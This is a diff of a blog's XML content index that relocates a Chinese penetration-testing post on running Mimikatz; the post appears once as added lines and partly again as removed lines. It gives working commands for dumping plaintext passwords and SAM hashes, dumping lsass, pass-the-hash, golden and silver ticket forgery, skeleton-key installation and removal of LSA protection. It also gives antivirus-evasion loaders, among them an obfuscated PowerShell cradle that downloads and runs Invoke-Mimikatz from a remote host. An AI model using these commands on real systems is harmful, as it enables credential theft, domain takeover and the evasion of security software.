@@ -1394,6 +1394,242 @@
       </tags>
   </entry>
   <entry>
+    <title>Mimikatz运行姿势</title>
+    <url>/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/</url>
+    <content><![CDATA[<h1 id="Mimikatz运行姿势"><a href="#Mimikatz运行姿势" class="headerlink" title="Mimikatz运行姿势"></a>Mimikatz运行姿势</h1><hr>
+<p>上篇文章记录了Mimikatz神器的基本命令和很多模块的使用方法命令。由于在实际环境中可能会产生不同的问题，这篇文章记录学习Mimikatz工具的使用姿势和一些免杀方法。</p>
+<h2 id="获取本地账户密码"><a href="#获取本地账户密码" class="headerlink" title="获取本地账户密码"></a>获取本地账户密码</h2><hr>
+<h3 id="本地执行"><a href="#本地执行" class="headerlink" title="本地执行"></a>本地执行</h3><p>首先将执行权限提升为debug权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103103351984.png" class title="image-20211103103351984">
+
+
+
+<p>使用sekurlsa模块抓取明文密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103103420451.png" class title="image-20211103103420451">
+
+
+
+<p>注:当目标为win10或2012R2以上时，默认禁止在内存中保存明文密码，但可以通过修改注册表的方式来抓取明文。</p>
+<p>修改命令如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\Sec urityProviders\WDigest  /v UseLogonCredential /t REG_DWORD  /d  1  /f</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103105046333.png" class title="image-20211103105046333">
+
+
+
+<h3 id="SAM表离线获取hash"><a href="#SAM表离线获取hash" class="headerlink" title="SAM表离线获取hash"></a>SAM表离线获取hash</h3><p>导出SAM数据库的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg  save  HKLM\SYSTEM  SYSTEM(自定义名称)</span><br><span class="line"></span><br><span class="line">reg  save  HKLM\SAM SAM(自定义名称)</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103110249663.png" class title="image-20211103110249663">
+
+
+
+<p>提取导出SAM数据中的hash(确保Mimikatz和导出文件在同一目录下或者指定SAM数据的绝对&#x2F;相对路径)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::sam /sam:SAM(自定义名称)  /system:SYSTEM(自定义名称)</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103110638898.png" class title="image-20211103110638898">
+
+
+
+<h2 id="Procdump-Mimikatz"><a href="#Procdump-Mimikatz" class="headerlink" title="Procdump+Mimikatz"></a>Procdump+Mimikatz</h2><hr>
+<p>当mimikatz无法在目标主机上正常运行时，可以使用微软提供的工具Procdump导出lsass.exe进程</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">procsump64.exe -accepteula -ma lsass.exe  lsass.tmp</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103111347692.png" class title="image-20211103111347692">
+
+
+
+<p>使用 mimikatz的sekurlsa模块对导出的lsass.dmp文件。先使用minidump恢复到lsass.exe的状态，然后使用logonpasswords导出明文密码信息</p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103113844380.png" class title="image-20211103113844380">
+
+
+
+<p>可看到passwords.txt文档中系统的明文密码信息</p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103115851943.png" class title="image-20211103115851943">
+
+
+
+<h2 id="哈希传递攻击PTH"><a href="#哈希传递攻击PTH" class="headerlink" title="哈希传递攻击PTH"></a>哈希传递攻击PTH</h2><hr>
+<h3 id="工作组环境"><a href="#工作组环境" class="headerlink" title="工作组环境"></a>工作组环境</h3><p>当我们获取到某一台主机中用户的NTLM哈希值时，可以直接将获取到的NTLM哈希值登录目标主机</p>
+<p>命令；</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa:pt /user:用户名   /domain:ip地址    /ntlm:用户的ntlm哈希值</span><br></pre></td></tr></table></figure>
+
+<p>如下所示，我们可以直接登录目标主机cmd管理窗口，执行命令</p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103130911394.png" class title="image-20211103130911394">
+
+<p>注：只能在 mimikatz 弹出的 cmd 窗口才可以执行这些操作，注入成功后，可以使用psexec、wmic、wmiexec等实现远程执行命令</p>
+<h3 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h3><p>在域环境下，如果获取到某一用户的ntlm哈希值，可以在域环境下任意主机登录用户，若获取到域控 管理员的账号和ntlm哈希值即可 登录域控。</p>
+<p>命令:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa:pth  /user:用户  /domain:&quot;域名&quot;  /ntlm:用户ntlm哈希值</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="票据传递攻击"><a href="#票据传递攻击" class="headerlink" title="票据传递攻击"></a>票据传递攻击</h2><hr>
+<h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>在域环境下，每个用户的ticcket都是由krbtgt的密码NTLM哈希进行加密传输的，只要获取到krbtgt用户的密码NTLM哈希值就可以随意伪造Ticket，从而使用Ticket登录域控，使用krbtgt用户密码HTLM哈希生成的票据为黄金票据</p>
+<p>首先获取krbtft用户的NTLM哈希值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz  &quot;lsamdump::dcsync  /domain:xxx.com  /user:krbtgt&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>利用mimikatz生成域管理员权限的黄金票据，输入域管理员对应的账号，域名称和sid值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::golden /admin:administrator /domain:xxx.COM /sid:管理员SID值 /krbtgt:krbtgt用户的哈希值 /ticket:test.kiribi(生成的票据)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>导出上面生成的票据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::ptt  test.kiribi</span><br></pre></td></tr></table></figure>
+
+
+
+<p>查看导入后获取的域管权限，查看主机的目录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir  \\$DC$.xxx.com\c$</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><p>白银票据是伪造 TGS(票据授权服务)，只能访问指定的服务，由客户端计算机账号的NTLM哈希值进行加密。</p>
+<p>下面使用白银票据伪造CIFS(用于Windows主机之间进行网络文件共享)服务权限</p>
+<p>提升权限，获取主机账号的哈希值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">sekurlsa::logonpasswords</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103161547663.png" class title="image-20211103161547663">
+
+<p>这里的liukaifeng01的SID为S-1-5-21-295270202-1353902439-2381782089(不要后面的-1000)</p>
+<p>伪造的OWA的NTLM哈希为84883cf100e1f84e2a2468f08d6d0e4f</p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103162043108.png" class title="image-20211103162043108">
+
+
+
+<p>生成白银票据命令 :</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::golden /domain:[domain] /sid:[SID] /target:服务用户.xxx.com /rc4:[server&#x27;s Hash] /service:[service] /user:[username] /ptt</span><br></pre></td></tr></table></figure>
+
+
+
+<p>如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::golden /domain:GOD /sid:S-1-5-21-295270202-1353902439-2381782089( /target:OWA.GOD.com /rc4:84883cf100e1f84e2a2468f08d6d0e4f /service:cifs /user:liukaifeng01 /ptt</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103162850526.png" class title="image-20211103162850526">
+
+<p>可以看到此时的liukaifeng01的key变成了OWA的，服务为cifs，生成了获取cifs的白银票据</p>
+<p>伪造白银票据后，我们就可以远程访问DC</p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103163128580.png" class title="image-20211103163128580">
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注:若使用dir \\主机名\c$不能访问，则输入主机全名dir \\主机名.域名.com\c$</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="万能密钥"><a href="#万能密钥" class="headerlink" title="万能密钥"></a>万能密钥</h3><p>skeleton key(万能钥匙)就是给所有域内用户添加一个相同的密码，域内所有的用户 都可以使用这个密码进行认证，同时原始密码也可以使用，其原理是对 lsass.exe 进行注 入，所以重启后会失效</p>
+<p>在域控上安装skeleton key</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe privilege::debug &quot;misc::skeleton&quot;</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103171351475.png" class title="image-20211103171351475">
+
+
+
+<p>在域内其他机器使用skeleton key去访问域控，添加密码围殴mimikatz</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net  use   \\主机名.xxx.com\c$  mimikatz(密码)  /user:adtest \administrator</span><br></pre></td></tr></table></figure>
+
+
+
+<p>微软在 2014 年 3 月 12 日添加了 LSA 爆护策略，用来防止对进程 lsass.exe 的代码注入。如果直接尝试添加 skelenton key 会失败。</p>
+<p>但mimikatz依然可以绕过，需要导入mimidrv.sys文件，命令如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">!+</span><br><span class="line">!processprotect /process:lsass.exe /remove </span><br><span class="line">misc::skeleton</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103172059633.png" class title="image-20211103172059633">
+
+
+
+<h2 id="免杀处理"><a href="#免杀处理" class="headerlink" title="免杀处理"></a>免杀处理</h2><hr>
+<h3 id="Invoke-Mimikatz"><a href="#Invoke-Mimikatz" class="headerlink" title="Invoke-Mimikatz"></a>Invoke-Mimikatz</h3><p>在powershell中导入invoke-Mimikatz.ps1，加载mimikatz模块</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -exec bypass “import-module .Invoke-Mimikatz.ps1”</span><br></pre></td></tr></table></figure>
+
+<p>运行mimikazt模块</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -exec bypass “invoke-Mimikatz”</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103194723187.png" class title="image-20211103194723187">
+
+<p>在cmd中运行过程中没有被拦截</p>
+<p>使用poweshell加载远程服务器的ps脚本，会被360拦截</p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103200143717.png" class title="image-20211103200143717">
+
+
+
+<p>稍微做了简单的混淆</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -c &quot; (&#x27;IEX &#x27;+&#x27;(Ne&#x27;+&#x27;w-O&#x27;+&#x27;bject Ne&#x27;+&#x27;t.W&#x27;+&#x27;ebClien&#x27;+&#x27;t).Do&#x27;+&#x27;wnloadS&#x27;+&#x27;trin&#x27;+&#x27;g&#x27;+&#x27;(&#x27;+&#x27;1vchttp://&#x27;+&#x27;192.168.211&#x27;+&#x27;.1/&#x27;+&#x27;Inv&#x27;+&#x27;oke-Mimik&#x27;+&#x27;a&#x27;+&#x27;tz.&#x27;+&#x27;ps11v&#x27;+&#x27;c)&#x27;+&#x27;;&#x27;+&#x27;I&#x27;+&#x27;nvoke-Mimika&#x27;+&#x27;tz&#x27;).REplaCE(&#x27;1vc&#x27;,[STRing][CHAR]39)|IeX&quot;</span><br></pre></td></tr></table></figure>
+
+<p>还是被拦截</p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103200627835.png" class title="image-20211103200627835">
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103200702681.png" class title="image-20211103200702681">
+
+
+
+<p>所以最好将Invoke-Mimikatz.ps1文件放置在目标主机上执行powershell加载模块运行imikatz</p>
+<h3 id="使用-net2-0"><a href="#使用-net2-0" class="headerlink" title="使用.net2.0"></a>使用.net2.0</h3><p>首先下载<a href="https://raw.githubusercontent.com/ssssanr/Mimikatz-Csharp/master/katz.cs">katz.cs</a>，将katz.cs文件保存到本地</p>
+<p>并放在对应的系统版本的Framework目录中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">32位：C:\Windows\Microsoft.NET\Framework\v2.0.50727</span><br><span class="line">64位：C:\Windows\Microsoft.NET\Framework64\v2.0.50727</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后在powershell中执行命令生成key.snk</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$key=&#x27;BwIA AAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z 6 4cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5cl HIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4=&#x27;</span><br><span class="line"></span><br><span class="line">$Content = [System.Convert]::FromBase64String($key)</span><br><span class="line"></span><br><span class="line">Set-Content key.snk -Value $Content -Encoding Byte</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103202206247.png" class title="image-20211103202206247">
+
+
+
+<p>最后生成mimikatz，在运行mimikatz</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">32位:</span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727&gt;.\csc.exe /r:System.EnterpriseServices.dll /out:katz.exe /keyfile:key.snk /unsafe katz.cs C:\Windows\Microsoft.NET\Framework\v2.0.50727&gt;.\regsvcs.exe katz.exe</span><br><span class="line"></span><br><span class="line">64位:</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v2.0.5072 7&gt;.\csc.exe /r:System.EnterpriseServices.dll /out:katz.exe /keyfile:key.snk /unsafe katz.cs C:\Windows\Microsoft.NET\Framework64\v2.0.50727&gt;.\regsvcs.exe katz.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>在运行时被360发现啦，火绒没有反应</p>
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103202433218.png" class title="image-20211103202433218">
+
+
+
+<h3 id="使用-net4-0"><a href="#使用-net4-0" class="headerlink" title="使用.net4.0"></a>使用.net4.0</h3><p>下载[mimikatz.xml](<a href="https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes">https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes</a> mimikatz.xml)，将其保存在Framework64文件下的v4,0文件下并运行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msbuild.exe mimikatz.xml</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103203026847.png" class title="image-20211103203026847">
+
+<p>360和火绒都没有报毒和进行拦截</p>
+<h3 id="js加载mimikatz"><a href="#js加载mimikatz" class="headerlink" title="js加载mimikatz"></a>js加载mimikatz</h3><p>下载<a href="https://gist.github.com/500646/14051b27b45dce37818aca915e93062f/raw/2adcc9d2570b4367c6cc405e5a5969863d04fc9b/katz.js">katz.js</a>，执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scsript mimikatz.js</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103204511543.png" class title="image-20211103204511543">
+
+
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103204537821.png" class title="image-20211103204537821">
+
+<p>360拦截了，火绒没绕过</p>
+<h3 id="jscript的xsl版"><a href="#jscript的xsl版" class="headerlink" title="jscript的xsl版"></a>jscript的xsl版</h3><p>本地加载mimikatz.xsl文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic os get /format:&quot;mimikatz.xsl&quot;</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103204250467.png" class title="image-20211103204250467">
+
+<p>360和火绒都没有拦截</p>
+<h2 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h2><hr>
+<h3 id="导出chrome中的密码"><a href="#导出chrome中的密码" class="headerlink" title="导出chrome中的密码"></a>导出chrome中的密码</h3><p><a href="https://mp.weixin.qq.com/s?__biz=MzIzOTg0NjYzNg==&mid=2247483949&idx=1&sn=db4853c88e4bf0a550c095d9017a363c&chksm=e92297aede551eb815a604ba944c4666b260c5bfe044e1b3a60946b586fd5679e29db0adf18d&mpshare=1&scene=23&srcid=&sharer_sharetime=1582350092849&sharer_shareid=d32981e13d51bf06188894426d2a54e5#rd">使用mimikatz导出chrome中的密码 (qq.com)</a></p>
+<h3 id="隐藏功能"><a href="#隐藏功能" class="headerlink" title="隐藏功能"></a>隐藏功能</h3><p>管理员常常会禁用一些重要程序的运行，比如cmd、regedit、taskmgr，此时不方便渗透的进一步进行，这里除了去改回原来的配置，还可以借助mimikatz的一些功能：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Copyprivilege::debug</span><br><span class="line">misc::cmd</span><br><span class="line">misc::regedit</span><br><span class="line">misc::taskmgr</span><br></pre></td></tr></table></figure>
+
+
+
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+        <category>渗透工具</category>
+      </categories>
+      <tags>
+        <tag>-内网渗透 -工具使用 -免杀处理</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>MongoDB未授权访问漏洞</title>
     <url>/2021/06/11/MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<h1 id="MongoDB未授权访问"><a href="#MongoDB未授权访问" class="headerlink" title="MongoDB未授权访问"></a>MongoDB未授权访问</h1><h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><p>测试环境：Centos7</p>
@@ -1709,242 +1945,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Mimikatz运行姿势</title>
-    <url>/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/</url>
-    <content><![CDATA[<h1 id="Mimikatz运行姿势"><a href="#Mimikatz运行姿势" class="headerlink" title="Mimikatz运行姿势"></a>Mimikatz运行姿势</h1><hr>
-<p>上篇文章记录了Mimikatz神器的基本命令和很多模块的使用方法命令。由于在实际环境中可能会产生不同的问题，这篇文章记录学习Mimikatz工具的使用姿势和一些免杀方法。</p>
-<h2 id="获取本地账户密码"><a href="#获取本地账户密码" class="headerlink" title="获取本地账户密码"></a>获取本地账户密码</h2><hr>
-<h3 id="本地执行"><a href="#本地执行" class="headerlink" title="本地执行"></a>本地执行</h3><p>首先将执行权限提升为debug权限</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103103351984.png" class title="image-20211103103351984">
-
-
-
-<p>使用sekurlsa模块抓取明文密码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103103420451.png" class title="image-20211103103420451">
-
-
-
-<p>注:当目标为win10或2012R2以上时，默认禁止在内存中保存明文密码，但可以通过修改注册表的方式来抓取明文。</p>
-<p>修改命令如下:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\Sec urityProviders\WDigest  /v UseLogonCredential /t REG_DWORD  /d  1  /f</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103105046333.png" class title="image-20211103105046333">
-
-
-
-<h3 id="SAM表离线获取hash"><a href="#SAM表离线获取hash" class="headerlink" title="SAM表离线获取hash"></a>SAM表离线获取hash</h3><p>导出SAM数据库的数据</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg  save  HKLM\SYSTEM  SYSTEM(自定义名称)</span><br><span class="line"></span><br><span class="line">reg  save  HKLM\SAM SAM(自定义名称)</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103110249663.png" class title="image-20211103110249663">
-
-
-
-<p>提取导出SAM数据中的hash(确保Mimikatz和导出文件在同一目录下或者指定SAM数据的绝对&#x2F;相对路径)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::sam /sam:SAM(自定义名称)  /system:SYSTEM(自定义名称)</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103110638898.png" class title="image-20211103110638898">
-
-
-
-<h2 id="Procdump-Mimikatz"><a href="#Procdump-Mimikatz" class="headerlink" title="Procdump+Mimikatz"></a>Procdump+Mimikatz</h2><hr>
-<p>当mimikatz无法在目标主机上正常运行时，可以使用微软提供的工具Procdump导出lsass.exe进程</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">procsump64.exe -accepteula -ma lsass.exe  lsass.tmp</span><br></pre></td></tr></table></figure>
-
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103111347692.png" class title="image-20211103111347692">
-
-
-
-<p>使用 mimikatz的sekurlsa模块对导出的lsass.dmp文件。先使用minidump恢复到lsass.exe的状态，然后使用logonpasswords导出明文密码信息</p>
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103113844380.png" class title="image-20211103113844380">
-
-
-
-<p>可看到passwords.txt文档中系统的明文密码信息</p>
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103115851943.png" class title="image-20211103115851943">
-
-
-
-<h2 id="哈希传递攻击PTH"><a href="#哈希传递攻击PTH" class="headerlink" title="哈希传递攻击PTH"></a>哈希传递攻击PTH</h2><hr>
-<h3 id="工作组环境"><a href="#工作组环境" class="headerlink" title="工作组环境"></a>工作组环境</h3><p>当我们获取到某一台主机中用户的NTLM哈希值时，可以直接将获取到的NTLM哈希值登录目标主机</p>
-<p>命令；</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa:pt /user:用户名   /domain:ip地址    /ntlm:用户的ntlm哈希值</span><br></pre></td></tr></table></figure>
-
-<p>如下所示，我们可以直接登录目标主机cmd管理窗口，执行命令</p>
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103130911394.png" class title="image-20211103130911394">
-
-<p>注：只能在 mimikatz 弹出的 cmd 窗口才可以执行这些操作，注入成功后，可以使用psexec、wmic、wmiexec等实现远程执行命令</p>
-<h3 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h3><p>在域环境下，如果获取到某一用户的ntlm哈希值，可以在域环境下任意主机登录用户，若获取到域控 管理员的账号和ntlm哈希值即可 登录域控。</p>
-<p>命令:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa:pth  /user:用户  /domain:&quot;域名&quot;  /ntlm:用户ntlm哈希值</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="票据传递攻击"><a href="#票据传递攻击" class="headerlink" title="票据传递攻击"></a>票据传递攻击</h2><hr>
-<h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>在域环境下，每个用户的ticcket都是由krbtgt的密码NTLM哈希进行加密传输的，只要获取到krbtgt用户的密码NTLM哈希值就可以随意伪造Ticket，从而使用Ticket登录域控，使用krbtgt用户密码HTLM哈希生成的票据为黄金票据</p>
-<p>首先获取krbtft用户的NTLM哈希值</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz  &quot;lsamdump::dcsync  /domain:xxx.com  /user:krbtgt&quot;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>利用mimikatz生成域管理员权限的黄金票据，输入域管理员对应的账号，域名称和sid值</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::golden /admin:administrator /domain:xxx.COM /sid:管理员SID值 /krbtgt:krbtgt用户的哈希值 /ticket:test.kiribi(生成的票据)</span><br></pre></td></tr></table></figure>
-
-
-
-<p>导出上面生成的票据</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::ptt  test.kiribi</span><br></pre></td></tr></table></figure>
-
-
-
-<p>查看导入后获取的域管权限，查看主机的目录</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir  \\$DC$.xxx.com\c$</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><p>白银票据是伪造 TGS(票据授权服务)，只能访问指定的服务，由客户端计算机账号的NTLM哈希值进行加密。</p>
-<p>下面使用白银票据伪造CIFS(用于Windows主机之间进行网络文件共享)服务权限</p>
-<p>提升权限，获取主机账号的哈希值</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">sekurlsa::logonpasswords</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103161547663.png" class title="image-20211103161547663">
-
-<p>这里的liukaifeng01的SID为S-1-5-21-295270202-1353902439-2381782089(不要后面的-1000)</p>
-<p>伪造的OWA的NTLM哈希为84883cf100e1f84e2a2468f08d6d0e4f</p>
-<img src="/2021/11/03/Mimikatz%E8%BF%90%E8%A1%8C%E5%A7%BF%E5%8A%BF/image-20211103162043108.png" class title="image-20211103162043108">
-
-
-
-<p>生成白银票据命令 :</p>
